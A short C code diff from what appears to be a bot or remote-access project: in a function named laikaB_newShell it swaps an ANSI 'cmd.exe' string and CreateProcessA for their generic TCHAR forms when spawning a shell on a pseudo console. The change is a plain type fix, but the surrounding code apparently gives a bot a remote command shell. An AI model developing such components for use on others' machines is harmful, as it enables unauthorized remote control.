@@ -80,7 +80,7 @@ HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo
 
 struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows) {;
     HRESULT hr;
-    char cmd[] = "cmd.exe";
+    LPCTSTR cmd = TEXT("cmd.exe");
     struct sLaika_shell* shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));
 
     ZeroMemory(shell, sizeof(struct sLaika_shell));
@@ -102,7 +102,7 @@ struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows)
     }
 
     /* launch cmd shell */
-    hr = CreateProcessA(
+    hr = CreateProcess(
         NULL,                           /* No module name - use Command Line */
         cmd,                            /* Command Line */
         NULL,                           /* Process handle not inheritable */
